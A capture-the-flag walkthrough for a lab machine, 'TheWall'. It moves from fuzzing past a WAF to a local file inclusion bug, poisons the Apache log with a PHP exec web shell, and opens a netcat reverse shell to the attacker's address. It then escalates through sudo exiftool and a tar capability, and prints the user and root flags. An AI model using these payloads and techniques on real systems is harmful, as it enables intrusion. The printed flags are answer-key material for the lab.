# TheWall

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.31:22
Open 10.0.2.31:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.31
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 89:60:29:db:68:6d:13:34:98:b9:d0:17:24:56:a8:9e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChNipr9+bjOokVMBrjSmrgIJS/wPTcNhqFO1J88LuelAOdxbi4OhVAxb+57X3oKKUsAlVcdA37dqf0lVofAxiWmv2ZaeSwpb0WaMWFu5EjWvcsuk58GP9jjEf0L1/0+KZhTFHZDjk9Z5dmFfQHShN6W7eHWBq8wEyGt2re5PG4f3rYw+xg67FJvhJL/Pe73AKy+Obw2Sz5TCRtzUsGJ/TBmGrdwRHAY2l1gLLhf88d0gS7e1b3MyampOA8/qao7DdbFgXC9rVCBJXDIC6e7EG8FyMRYlwl6CvH4mqENvsV8z7p7DXCXysd2I+bnnyPxGRhqLEMMZwTyg7rsU3dl6B3u2L0PjwrEAqaeAwG954E8wbw2ZNu96s4ur09Mv2dXnNP1YUfwPBJPx8/GcNkmaqLbE5mv4QWy2yU0GFolL7IsLKiEY+t9IDB1uuaBfzIVMKeMy79UB6MLHkLf6XZtrf+ZwtH6X+4tYTh+Oq1E/dWvesrmCbQGKT+7ySqwhkpX6E=
|   256 66:58:51:6d:cd:3a:67:46:36:56:9a:31:a0:08:13:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLFGz/P+fNPCJ1TCYaVG4Tdd+S4Lv7xOhue5O9FydkuNTIpH3Bk8FN6RjBuZC0rrJs09JW6ld3auLqxjr+0O+lk=
|   256 f7:34:9e:53:68:ba:c2:06:ab:14:c3:21:90:2d:6e:64 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILDTmiQOvs05b9nDE3ynMrEE9keomXq4VzGk0r6koRdr
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

### WAF Bypass

```bash
└─$ curl http://10.0.2.31/ -i
HTTP/1.1 200 OK
Date: Thu, 12 Feb 2026 00:01:41 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 25
Content-Type: text/html; charset=UTF-8

<h1>HELLO WORLD!</h1>

└─$ curl http://10.0.2.31/robots.txt
<h1>Not Found</h1>                                                                                    
```

```bash
└─$ feroxbuster -u http://10.0.2.31/ --thorough --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
200      GET        2l        2w       25c http://10.0.2.31/
403      GET        0l        0w       18c http://10.0.2.31/mina
403      GET        0l        0w       18c http://10.0.2.31/mozilla
...
```

Looks like there's WAF in place because any request is now blocked
```bash
└─$ curl http://10.0.2.31/
<h1>Forbidden</h1>
```

Application is PHP based, include extensions and decrease threads
```bash
└─$ curl http://10.0.2.31/index.php
<h1>HELLO WORLD!</h1>
```

Still blocked
```bash
└─$ feroxbuster -u http://10.0.2.31/ --thorough --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -D -S 18 -x .php -t 3
```

### Fuzzing

```bash
└─$ ffuf -u 'http://10.0.2.31/FUZZ.php' -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 18 -t 2 -p 0.7
 :: Method           : GET
 :: URL              : http://10.0.2.31/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 2
 :: Delay            : 0.70 seconds
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 18
________________________________________________
includes                [Status: 200, Size: 2, Words: 1, Lines: 2, Duration: 2ms]
index                   [Status: 200, Size: 25, Words: 2, Lines: 3, Duration: 4ms]
```

```bash
└─$ curl http://10.0.2.31/includes.php -i
HTTP/1.1 200 OK
Date: Thu, 12 Feb 2026 00:45:19 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 2
Content-Type: text/html; charset=UTF-8
```

```bash
└─$ ffuf -u 'http://10.0.2.31/includes.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 2 -t 5 -p 0.6
# Nothing
```

Before bruteforcing anything let's search for keywords we can use as params
```bash
└─$ grep -E 'view|page|file|include' /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt | grep -v '\-' | sort > params.txt

└─$ ffuf -u 'http://10.0.2.31/includes.php?FUZZ=/etc/passwd' -w params.txt -fs 2 -t 5 -p 0.6
display_page            [Status: 200, Size: 1460, Words: 15, Lines: 29, Duration: 3ms]
```

### LFI

```bash
└─$ curl 'http://10.0.2.31/includes.php?display_page=/etc/passwd' -s | grep sh$
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:,,,:/home/john:/bin/bash
```

### RCE

We can read log files and since we can include it, the logs can be poisoned for RCE.
```bash
└─$ curl 'http://10.0.2.31/includes.php?display_page=/var/log/apache2/access.log' -s | tail -3
10.0.2.149 - - [11/Feb/2026:19:58:39 -0500] "GET /includes.php?display_page=index HTTP/1.1" 200 149 "-" "curl/8.17.0"
10.0.2.149 - - [11/Feb/2026:19:59:09 -0500] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 2239585 "-" "curl/8.17.0"
10.0.2.149 - - [11/Feb/2026:19:59:15 -0500] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 2239729 "-" "curl/8.17.0"
```

```bash
└─$ curl http://10.0.2.31 -A '<?php if(isset($_REQUEST[0])) { echo @exec($_REQUEST[0]); } ?>'
└─$ curl 'http://10.0.2.31/includes.php?display_page=/var/log/apache2/access.log&0=id' -s | tail -13
10.0.2.149 - - [11/Feb/2026:20:00:41 -0500] "GET / HTTP/1.1" 200 173 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
```

```bash
└─$ curl 'http://10.0.2.31/includes.php?display_page=/var/log/apache2/access.log' --data-urlencode '0=busybox nc 10.0.2.149 4444 -e /bin/bash' -s | tail -3
---
└─$ penelope -p 4444
www-data@TheWall:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

```bash
www-data@TheWall:/var/www/html$ sudo -l
Matching Defaults entries for www-data on TheWall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on TheWall:
    (john : john) NOPASSWD: /usr/bin/exiftool
```

- [https://gtfobins.org/gtfobins/exiftool/](https://gtfobins.org/gtfobins/exiftool/)

We can read files as john, but they don't have SSH keys
```bash
www-data@TheWall:/var/www/html$ f=$(mktemp -u); sudo -u john exiftool -filename=$f /etc/passwd && cat $f | grep sh$
Warning: Error removing old file - /etc/passwd
    1 image files updated
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:,,,:/home/john:/bin/bash
www-data@TheWall:/var/www/html$ f=$(mktemp -u); sudo -u john exiftool -filename=$f /home/john/.ssh/id_rsa && cat $f
Error: File not found - /home/john/.ssh/id_rsa
    0 image files updated
    1 files weren't updated due to errors
```

### SSH

Let's create one
```bash
└─$ gen_ssh_deploy id_rsa john
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p john/.ssh ; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILLKBKx1FkrJAWyLBT2p57iiJj5iXa1uK6+bDQEguxPP woyag@kraken' >> john/.ssh/authorized_keys ; chmod 700 john/.ssh ; chmod 600 john/.ssh/authorized_keys
```

```bash
www-data@TheWall:/var/www/html$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILLKBKx1FkrJAWyLBT2p57iiJj5iXa1uK6+bDQEguxPP woyag@kraken' > /tmp/auth
www-data@TheWall:/var/www/html$ sudo -u john exiftool -filename=/home/john/.ssh/authorized_keys /tmp/auth
Warning: Error removing old file - /tmp/auth
    1 image files updated
```

```bash
└─$ ssh -i id_rsa john@10.0.2.31
john@TheWall:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(bluetooth)
```

### User.txt

```
john@TheWall:~$ cat user.txt
cc5db5e7b0a26e807765f47a006f6221
```

## Privilege Escalation

No sudo or interesting SUID binaries
```bash
john@TheWall:~$ find / -perm -4000 -ls 2>/dev/null
    28484    180 -rwsr-xr-x   1 root     root       182600 Feb 27  2021 /usr/sbin/sudo
      392     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd
      393     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd
      390     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh
      389     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn
     3973     72 -rwsr-xr-x   1 root     root        71912 Jan 20  2022 /usr/bin/su
     3806     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp
     4375     36 -rwsr-xr-x   1 root     root        35040 Jan 20  2022 /usr/bin/umount
     4373     56 -rwsr-xr-x   1 root     root        55528 Jan 20  2022 /usr/bin/mount
     4853     52 -rwsr-xr--   1 root     messagebus    51336 Oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    23522    472 -rwsr-xr-x   1 root     root         481608 Jul  1  2022 /usr/lib/openssh/ssh-keysign
```

`tar` does have unusual capability
```bash
john@TheWall:~$ /usr/sbin/getcap / -r 2>/dev/null
/usr/sbin/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

::: info Note
Make sure to always use absolute path for `getcap` since `sbin` maybe not be in PATH sometimes.
:::

`cap_dac_read_search` means `read anything`

```bash
john@TheWall:~$ /usr/sbin/tar -czvf /tmp/root.tar.gz /root
/root/
/root/.local/
/root/.local/share/
/root/.local/share/nano/
/root/.bashrc
/root/.profile
/root/.ssh/
/root/.ssh/authorized_keys
/root/r0Ot.txT
/root/.bash_history

john@TheWall:~$ cd /tmp
john@TheWall:/tmp$ tar -xvzf root.tar.gz
john@TheWall:/tmp$ cd root
```

We can grab flag from `/root` directly.

There's also SSH keys in `/` so it must belong to root
```bash
john@TheWall:/tmp/root$ ls -alh /id_rsa*
-rw------- 1 root root 2.6K Oct 19  2022 /id_rsa
-rw-r--r-- 1 root root  566 Oct 19  2022 /id_rsa.pub
```

Alternatively we could read `/etc/shadow` and try cracking password

### Root.txt

But this is enough
```bash
john@TheWall:/tmp/root$ cat r0Ot.txT
4be82a3be9aed6eea5d0cce68e17662e
```